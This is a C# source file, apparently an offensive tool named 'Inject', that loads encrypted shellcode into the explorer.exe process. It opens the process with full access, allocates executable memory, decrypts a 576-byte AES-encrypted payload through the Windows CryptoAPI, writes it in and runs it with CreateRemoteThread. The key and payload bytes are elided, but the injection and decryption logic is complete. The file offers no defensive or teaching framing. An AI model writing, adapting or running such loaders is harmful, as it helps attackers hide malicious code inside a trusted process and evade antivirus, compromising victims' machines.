using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program()
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr OpenProcess( uint processAccess, bool bInheritHandle, uint processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CryptAcquireContext(out IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CryptCreateHash(IntPtr hProv, uint algId, IntPtr hKey, uint dwFlags, out IntPtr phHash);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, uint dataLen, uint flags);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CryptDestroyKey(IntPtr phKey);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CryptDeriveKey(IntPtr hProv, uint Algid, IntPtr hBaseData, uint dwFlags, out IntPtr phKey);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, int Final, uint dwFlags, byte[] pbData, out uint pdwDataLen);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CryptDestroyHash(IntPtr hHash);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

        private const uint PROV_RSA_AES = 24;
        private const uint CRYPT_VERIFYCONTEXT = 0xF0000000;
        private const uint CALG_SHA_256 = 0x0000800c;
        private const uint CALG_AES_256 = 0x00006610;

        public static int AESDecrypt(byte[] payload, uint payloadLen, byte[] key, uint keyLen)
        {
            IntPtr hProv;
            IntPtr hHash;
            IntPtr hKey;

            if (!CryptAcquireContext(out hProv, null, null, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
            {
                return -1;
            }
            if (!CryptCreateHash(hProv, CALG_SHA_256, IntPtr.Zero, 0, out hHash))
            {
                CryptReleaseContext(hProv, 0);
                return -1;
            }
            if (!CryptHashData(hHash, key, keyLen, 0))
            {
                CryptDestroyHash(hHash);
                CryptReleaseContext(hProv, 0);
                return -1;
            }
            if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, out hKey))
            {
                CryptDestroyHash(hHash);
                CryptReleaseContext(hProv, 0);
                return -1;
            }
            if(!CryptDecrypt(hKey, hHash, 0, 0, payload, out payloadLen))
            {
                return -1;
            }

            CryptReleaseContext(hProv, 0);
            CryptDestroyHash(hHash);
            CryptDestroyKey(hKey);

            return 0;
        }


        static void Main(string[] args)
        {
            Process[] proc = Process.GetProcessesByName("explorer");
            int pid = proc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, (uint)pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            byte[] key = new byte[16] ...

            byte[] buf = new byte[576] ...

            AESDecrypt(buf, (uint)buf.Length, key, (uint)key.Length);

            IntPtr outSize;

            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}